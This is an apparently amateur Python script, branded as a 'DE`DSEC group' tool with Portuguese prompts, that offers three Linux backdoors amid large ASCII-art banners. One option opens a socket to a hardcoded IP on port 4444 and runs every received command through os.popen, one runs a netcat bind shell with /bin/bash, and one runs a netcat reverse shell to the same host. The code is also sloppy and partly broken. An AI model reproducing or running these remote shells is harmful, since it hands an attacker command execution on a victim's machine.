import sys
import os
import socket
import re
import requests
import time
import platform
import shutil
import traceback
import threading
import uuid
import StringIO
import zipfile
import tempfile
import getpass
from os import chdir, getcwd
import subprocess
from time import sleep

y = True
n = False
number1 = 1
number2 = 2
number3 = 3
os.system("clear")

print    (" __________________________________________________________________")
print    ("|        ______  ________  ______  ________ ________________       |")
print    ("|       /  __  \/   ____/ /  __  \/    ___//   ____// ______\      |")
print    ("|      /  / /  /  ___/   /  / /  /\____  \/  ___/  / /	          |")
print    ("|     /  /_/  /  /_____ /  /_/  /_____/  /  /_____/ \_______       |")
print    ("|    /_______/________//_______//_______/________/\________/       |")
print    ("|                                                                  |")
print    ("|        			>:DE`DSEC group tools                         |")
print    ("|                                                                  |")
print    ("|__________________________________________________________________|")
print    ("                                                                    ")                                              

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

F0x = True
rootdedsecf0x = True

contaVerificaNome = input("Username : ")
contaVerificaPass = input("Password : ")

if F0x == contaVerificaNome:
	if rootdedsecf0x == contaVerificaPass:
		os.system("clear")
		print("                                                                                                `/sdmho-`                                              ")
		print("                                                                                            `.+ymds:.+ydds/`                                           ")
		print("                                                                                         `:oddh+-`     `:sdmy/.`                                       ")
		print("                                                                                      ./ydds/.`           `-+hddo:`                                    ")
		print("                                                                                 `-+hmMm+.                  `-sNNdy/.                                 ")
		print("                                                                               .:sddydMhhdho-`             ./sddymMyhdh+-`                             ")
		print("                                                                           `-+ydds/. sM+`./shdy/.      `-+ydho:. hN-`-+ydds:.                          ")
		print("                                                                        .:ohdho-`    sM+    `:ohdh+-.:shdy+-`    hM-    ./sddy/-`                      ")
		print("                                                                       /mmy/-`       sM+       `-+ymmds:.        hN-       `:ohmh-                     ")
		print("                                                                       oMs           sM+           yM:           hN-          `hM/                     ")
		print("                                                                       oMs           sM+           yM-           hM-           hM/                     ")
		print("                                                                       oMs           oM+           yM-           hN-           hM/                     ")
		print("                                                                       oMs         `.yM+           yM-           hM/.`         hM/                     ")
		print("                                                                       oMs      `-+hmdo.           yM-           :sddy+.`      hM/                     ")
		print("                                                                       oMs  `.:sdmh+-`             yM-             `-+ydhs:.`  hM/                     ")
		print("                                                                       oMs-+ymds/`                 yM-                 `:oddy+-hM/                     ")
		print("                                                                       oMNNh+-`                  `.hM/`                   `./yNNM/                     ")
		print("                                                                       oMNmy/.`               `-+hmhymds/.                `:sdmNM/                     ")
		print("                                                                       oMs-odmho-`         `:odmy+.  `:odmy+.`        `./ymms:`hM/                     ")
		print("                                                                       oMs   ./ymms/`   ./ymmo:`         ./ymdo:`   .+hmho-`   hM/                     ")
		print("                                                                       oMs      `:sdNhohNho-`               `:smmysdmy/.       hM/                     ")
		print("                                                                       oMs          .hMo`                       -dM+`          hM/                     ")
		print("                                                                       oMs           sM/                         hM-           hM/                     ")
		print("                                                                       oMs           sM:                         hM-           hM/                     ")
		print("                                                                       oMs           yM:           `.`           hM-           hM/                     ")
		print("                                                                       /mmy/.        hN-        ./ymmdo:`        hM-        .+yNd:                     ")
		print("                                                                        `:ohmh+-`    hN-    `:odmh+-./sdmy+-`    hM-    `:odmh+-`                      ")
		print("                                                                           `./ymds/. dN-`-+ymhs:.`     `-+yddo:. hN- -+ymds/.`                         ")
		print("                                                                               .:sdmhNNyddy+-`            `.:shdymMhdmho-`                             ")
		print("                                                                                  `-+hNMh/.                   -sNMmy/.`                                ")
		print("                                                                                     `./sddy/.`           `-+hmdo:.                                    ")
		print("                                                                                         `-ohdho-`     .:sddy+-`                                       ")
		print("                                                                                            `./ydds/-/ydds/.`                                          ")
		print("                                                                                                .:shdho-`                                              ")
		print("                                                                                                   `.`                                                 ")
		print("\n")
		print("\n")                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
		print("                                                                  yyyys:         :h-           `yo  `h+         sy.  `ss`        +hyyyo                ")
		print("                                                                  Nd::dd`        /M/           .my  .Ms         dMm:-dMm`        yN/---                ")
		print("                                                                  NNyhmm.        /M/           .my  .Ms         dmsmmsdm`        yMdhhs                ")
		print("                                                                  Nd--oN/        /M+---        `dm:-oN+         dd`:: dm`        yN/---                ")
		print("                                                                  yyyyy/`        :yyyyy.        .+yys/`         os`   os`        +yyyyo                ")



		print("[1] (Somente Linux) Instalar backdoor ? (PYTHON code) : ")
		print("[2] (Somente Linux) Instalar backdoor ? (Usa NetCat, conexao direta) : ")
		print("[3] (Somente Linux) Instalar backdoor ? (Usa NetCat, conexao reversa) : ")
		print("\n")
		install2 = input("Qual deseja usar ? ")
		if install2 == number1:
			os.system("clear")
			print("                                                                                    :/                                              ")    
			print("                                                                                    /o                                                  ")
			print("                                                                     ` ``````   ```` /o ````   ````````    .``                           ")
			print("                                                                 .--.hsoshhho-.-syyy:-/:dhho--:syhhhhhs-.-+hhh/--`--`                    ")
			print("                                                                 .d+yh/hsdddos+yshhh+hssdddsssoyhdddddhos+ohddy+y-ho:                    ")
			print("                                                                `:--/h+:/-//dddsssoyhdhoy/+hhhsos+yhddhhhyss/shhhsos-.``                   ") 
			print("                                                                /hhdhdhhhhhhddddddhhhhdhhdhyyyyyyyhdddyyyhhhhyyyhhdhy`                      ")
			print("                                                             :ddddddhhhhhdddddhhhhhhdhdhyyyyyyyhhdhyyyyhhhhyyyhddy`                      ")
			print("                                                          --:+hddhhyhhhhhhhhhdhdhyyhhhhhhhyhyyydhhdhhhdhhhhhhhddhy-/`                    ")
			print("                                                          yohyhhdyyyyyyhhyyyydhhyssyyyyyddhhhhhhhdhdhhhhhhhhhhhddy+h`                    ")
			print("                                                      ```.+++odddhyyyhhhhyyyhdddyyyyyyyhddhdhhddhddddddhdhdhdddddy-/                     ")
			print("                                                      `:o/ooosdddhhhhhhdhhhhhhhhyyyyyyyydddhhyhhhhhdddddhddddddddhoo+o::-                ")
			print("                                                    -ohshhhdddddddddhhddddhyyyyyyyyyyhdddhyyyyyyyddddhdhddddddddddhyss-                ")
			print("                                                     `.oohhdhdddhdhhhhhhhddhyyyyyyyyyyydddyyyyyyyyhddhhhdhhddhddhdhh+++                 ")
			print("                                                       .o`-o+---::sss+sosssh/yoy+sssyyyyhhyysssyhhhdohohsdsysh+soshod..+                 ")
			print("                                                       .h        ```.``..osd:d+hoyohyyyyyyyhy+hyhhydoy+h+mos+h`..-h+d.:y                 ")
			print("                                                       .h                ::+`+//-+::yyyyyyyo+:/shhy+`:-/ +:-`/   `/ /`-y                 ")
			print("                                                                `.                    `/``.``hshsyyysyoso+oo                   `.          ")       
			print("                                                                                /os/d/syyyyyy/h`:+.                                      ")
			print("                                                      `                           .oy:/.-/sys+:.: :`                        ``             ")
			print("                                                        d                           :ooos/y:s/s/o+s`                          //             ")
			print("                                                   m                           +h+yhso+h/doh+y`                          ++             ")
			print("                                                   `d`.::-`                 `---.::-://--+s:::-                       ``` //             ")
			print("                                                  `yosydhh.              -::odddsosyyyhyyyyohos`                     :ooh                ")
			print("                                                  `ysyydhh.`            `sod+dddsy+yyyyyyyy+h:`  ``                ``/y/h                ")
			print("                                                   ---sdhh///:-----------/+o/hhh+/+/oss++os/o+/ssss/+::-------::::/:+-::.                ")
			print("                                                  `ysyyddhs/ys-:/.   -::-+yh/yyyssssd:y//oh+hhddddyyy:`          -dym.ds+                ")
			print("                                                  `ysyyddhsy+so+h.` `:N+y+yh/yyyysyshso/:+dodhhdddyyoy-.o` ``````-y`h-ds+                ")
			print("                                                   -:-hdddoooohyhshhhyds+.::-ooo::::` `    -+so/ss+ooooyo+yyyyhhys::-`::.                ")
			print("                                                  -h/dyddhhhdhdhdhddhhhdhh/hoh/d.            /oy+shhddhdhdhdhdddddy/dso+m                ")
			print("                                                 .y+sydhddhhdhdddhdddhhhsoo:y+s.           .o++s+ohdddhdhdhdddddhy/s/y:s                ")
			print("                                                     .:y.:-...-+odhhhhhs::/`./             -+`-:/:hhdhhyhhhhh//s:/./`--                 ")
			print("                                                      .h -+- `:ooddddhhhh+h:-:              ` soshhdhddhhdhhhssd/hsm`:.                 ")
			print("                                                       .h  `://:sodhhhdhyo+o-   ````````       /o+ohddhhhhhhhh--s/o`s`                   ")
			print("                                                        `  +/`:.`.s++hhddhhhs//`ohhhhyhy       ohhhdddyo/s/++.     h.                    ")
			print("                                                            o/ :+-`dysyhhhhddshy/sdhhhdhyy/y:s+oshhddddym+ysys:     d.                    ")
			print("                                                           +: .-+/yo+sssyyyyossoshhhhhhysod-oy+oyyydhdys+o//+:     y`                    ")
			print("                                                       o`o ``:yhhhhhh/oo++/sohhhdhhhhhyhdhhso+o++s+hhhdhhy/+- `-s. `                     ")
			print("                                                       . .   :dhdddddys+dhosydddhddhhhhhdddhh+hhsoyhhdhddh+-``sod.                       ")
			print("                                                             -ossssss/oo+:::/ssssssssyosddds/::/ss+hdddsds:` `://- :`                    ")
			print("                                                      ....      ``y/oyhhy       -+/++yo+dddss++shhhdddy`m`.y://s+- d.                    ")
			print("                                                      .++.       .syymhdh       ````/h-:dddyyyydddddddy m -yshsyys`d.                    ")
			print("                                                      .-.-::/-`` -+ssso++://://:.   -+..hdd+-//o++o+oo+/h::-:+---/ +`                    ")
			print("                                                      :hsdyyhss+soddd.  .dhddddh/    `h.dhdo`+/    -//+dhh+`/.   `..-                    ")
			print("                                                      /s-myhho-s:odhd.--.hdhdhdd:    `m-ddd+`o+    -ss+hdh+.y- -..y+y`                   ")
			print("                                                      .//:yyho`- +ddhoys+:oo////...`+sho+++-.:.```.``../+/+++-./-`+o/                    ")
			print("                                                       -h`hhhs///sddddhhh -y`   :ooshdhhy/y +ys+yss/y++sh`yooos+o+so`                    ")
			print("                                                       :s:hhhssoyoddhhddy`-h``  :oo/yhhy-y: -os/+so:so:oy.yo/oo+s/oy`                    ")
			print("                                                         `/o/+hhho+//hhhhsyhssss:.-`---:yys/   +oss` `  ..`` `  ` ``                     ")
			print("                                                                   -:/ohddssodyhhhhddhddd/s/s`  -dddo/::ohhh`                              ")       
			print("                                                             :hyysh/yyyhhhhhddhh/d+s```-ddhysy+shhy`                                     ")
			print("                                                             `...`//:sysyhddddddydhyysyhhdh:-:.-::-`++o+o+oo+++/`                        ")
			print("                                                                 :sodsyyydhddddddhdhdhddddh.        sdhhhdhhyyys`                        ")
			print("                                                                 -o/-osssyhhhddddhyhhhhhhdh-````````syhyhyhhyyyo`                        ")
			print("                                                                     :/:+:/++yyyyy-.--...-.+yyyyyyyy:++:````````                         ")
			print("                                                                        +hsdh+ysyyyyy.        /yyyyyyyy-` .                                ") 
			print("                                                                     /:.o+++/ooooo`        -:///////.                                    ")
			print("                                                                                      .o`                                         ")
			print("\n")
			install = input("Install backdoor ? (y/n) : ")
			if y == install:
				os.system("cd /tmp/")
				print("Instalando backdoor\n")
				print("Conexao aberta com >DE`DSEC")
				
				s.connect(("192.168.0.28", 4444))
				s.send(" ____________________________\n")
				s.send("|                            |\n")
				s.send("|Conexao com >DE`DSEC aberta!|\n")
				s.send("|____________________________|\n")
				s.send("\n")
				data = s.recv(1024)
				s.send("root@>DE`DSEC#")
				while True:
					cmd_atacante = s.recv(1024)
					exec_atacante = os.popen(cmd_atacante)
					s.send(exec_atacante.read())
					
					if data.startswith("cd"):
						os.chdir(data[3:].replace("\n",''))
						s.send("Movendo para "+str(os.getcwd()))
						result="\n"
					else:
						result=os.popen(data).read()


	        			# if "cd " in data:
	        			# 	os.chdir(data[3:].strip("\n"))
	          		
							
						
	                   		
	            	# if data[:2] == 'cd':
	             #    	try:	
	             #        	chdir(data[3:])
	             #        	diretorio = getcwd()
	             #        	s.send(diretorio)
	             #        except:
	             #        	s.send("[-] Diretorio inexistente.")

     #            def dir(data)
					# diretorio = data                
     #           		 try:
     #               		os.system("cd diretorio")
     #               	except
     #               		chdir("cd diretorio")
     #               	return diretorio			 

		
    			# KEY_LENGTH = 2048
				# rand = Random.new().read
				# keypair = RSA.generate(KEY_LENGTH, rand)
				# decrypted = keypair.decrypt(data)
				# command_array = decrypted.split()					

	    # 		if command_array[0] == 'cd':
					# try:
					#    os.chdir(command_array[1])
					#    ciphertext = other_pub_key.encrypt('pwd: ' + os.getcwd(), 32)[0]
					#    sock.send(ciphertext + END_OF_OUTPUT)
					# except Exception as e:
					#    ciphertext = other_pub_key.encrypt(e.strerror, 32)[0]
					#    sock.send(ciphertext + END_OF_OUTPUT)

		
		if install2 == number2:
			os.system("clear || cls")
			print("                                                                             `.-:///////////:-.`                                        ")
			print("                                                                         `-///+/-.`````   `````.:/+///-`                                  ")
			print("                                                                  `/+/.`                                 `-++:`                           ")
			print("                                                                -++.                                        `.++-                         ")
			print("                                                              /o:`                                             `:o:                       ")
			print("                                                           :o-                                                  `-o:                     ")
			print("                                                          .o:                                                      `/o.                   ")
			print("                                                         /o`        ./                                     /         .o:                  ")
			print("                                                        o/          +N/                                   sM`          /+                 ")
			print("                                                      `s:           +sy:                                 +sm`           :o                ")
			print("                                                      s-            +o`h.                               :y`m`            :o               ")
			print("                                                     o/             +o -h`             `+.             .h` m`             ++              ")
			print("                                                    -s              +o  :y            :y:s/           `h-  m`              y.             ")
			print("                                                    y.              +o   +o         `oo` `+s`         y/   m`              .y             ")
			print("                                                   -s               +o    y/       .y:     :y-       oo    d`               y.            ")
			print("                                                   o:               +o    `h-     /s.       .s/     /y     d`               /+            ")
			print("                                                   h                +o     .h`  `o+`         `+s`  .h`     d`               .y            ")
			print("                                                   d                +o      :y -y:             :y-`h.      d.                d            ")
			print("                                                   d                +o       oys.               .sd/       d.                d            ")
			print("                                                   h                +o      `sd/                 ohs`      d.               `h            ")
			print("                                                   s.               +o     -y:`h.               -h`:y-     d.               :o            ")
			print("                                                   :o               +o    +s`  -h`             `h-  .s/    d.               s-            ")
			print("                                                    h               +o  `sh+////hy+///////////+yh////+ds`  d.              `h             ")
			print("                                                    /+              +o :y-.......yo...........+h.......:y- d.              o:             ")
			print("                                                     y.             +s+o`        `h.         `d.        `s+d.             -s              ")
			print("                                                     `y`            /h:           -h`        y/           /d.            .y`              ")
			print("                                                      -s`            `             /s       /s             `            `y.               ")
			print("                                                       .s.                          s/     .d`                         .s.                ")
			print("                                                       .s-                         `h-   `h-                         :o`                 ")
			eprint("                                                        ++`                        .h`  o+                        `o/                   ")
			print("                                                           .o:`                       :y :y                       `/o.                    ")
			print("                                                             :o:`                      osd`                     `:o-                      ")
			print("                                                               :+/`                     +-                    ./+-                        ")
			print("                                                                 ./+:`                                     `:+/.                          ")
			print("                                                                    -/+/.`                             `./+/.                             ")
			print("                                                                       `:/++:.``                 ``.:+//:`                                ")
			print("                                                                            .:///////:::::::///////:.                                     ")
			print("                                                                                     ``....``")
			install = input("Install backdoor ? (y/n)")                                           

			if y == install:
				os.system("cd /tmp/")
				os.system("sudo apt install netcat")
				os.system("")	
				while True:
					os.system("nc -c /bin/bash -l -p 4444")
					data = s.recv(1024)
					s.send(" ____________________________\n")
					s.send("|                            |\n")
					s.send("|Conexao com >DE`DSEC aberta!|\n")
					s.send("|____________________________|\n")
					s.send("\n")
					s.send("root@>DE`DSEC#")

		if install2 == number3:
			os.system("clear")
			print("                                                                             `.-:///////////:-.`                                        ")
			print("                                                                         `-///+/-.`````   `````.:/+///-`                                  ")
			print("                                                                  `/+/.`                                 `-++:`                           ")
			print("                                                                -++.                                        `.++-                         ")
			print("                                                              /o:`                                             `:o:                       ")
			print("                                                           :o-                                                  `-o:                     ")
			print("                                                          .o:                                                      `/o.                   ")
			print("                                                         /o`        ./                                     /         .o:                  ")
			print("                                                        o/          +N/                                   sM`          /+                 ")
			print("                                                      `s:           +sy:                                 +sm`           :o                ")
			print("                                                      s-            +o`h.                               :y`m`            :o               ")
			print("                                                     o/             +o -h`             `+.             .h` m`             ++              ")
			print("                                                    -s              +o  :y            :y:s/           `h-  m`              y.             ")
			print("                                                    y.              +o   +o         `oo` `+s`         y/   m`              .y             ")
			print("                                                   -s               +o    y/       .y:     :y-       oo    d`               y.            ")
			print("                                                   o:               +o    `h-     /s.       .s/     /y     d`               /+            ")
			print("                                                   h                +o     .h`  `o+`         `+s`  .h`     d`               .y            ")
			print("                                                   d                +o      :y -y:             :y-`h.      d.                d            ")
			print("                                                   d                +o       oys.               .sd/       d.                d            ")
			print("                                                   h                +o      `sd/                 ohs`      d.               `h            ")
			print("                                                   s.               +o     -y:`h.               -h`:y-     d.               :o            ")
			print("                                                   :o               +o    +s`  -h`             `h-  .s/    d.               s-            ")
			print("                                                    h               +o  `sh+////hy+///////////+yh////+ds`  d.              `h             ")
			print("                                                    /+              +o :y-.......yo...........+h.......:y- d.              o:             ")
			print("                                                     y.             +s+o`        `h.         `d.        `s+d.             -s              ")
			print("                                                     `y`            /h:           -h`        y/           /d.            .y`              ")
			print("                                                      -s`            `             /s       /s             `            `y.               ")
			print("                                                       .s.                          s/     .d`                         .s.                ")
			print("                                                       .s-                         `h-   `h-                         :o`                 ")
			print("                                                        ++`                        .h`  o+                        `o/                   ")
			print("                                                           .o:`                       :y :y                       `/o.                    ")
			print("                                                             :o:`                      osd`                     `:o-                      ")
			print("                                                               :+/`                     +-                    ./+-                        ")
			print("                                                                 ./+:`                                     `:+/.                          ")
			print("                                                                    -/+/.`                             `./+/.                             ")
			print("                                                                       `:/++:.``                 ``.:+//:`                                ")
			print("                                                                            .:///////:::::::///////:.                                     ")
			print("                                                                                     ``....``")
			install = input("Install backdoor ? (y/n)")                                           

			if y == install:
				os.system("cd /tmp/")
				os.system("sudo apt install netcat")
				os.system("")	
				while True:
					os.system("nc -c /bin/bash 192.168.0.28 4444")
					s.send(" ____________________________\n")
					s.send("|                            |\n")
					s.send("|Conexao com >DE`DSEC aberta!|\n")
					s.send("|____________________________|\n")
					s.send("\n")
					s.send("root@>DE`DSEC#")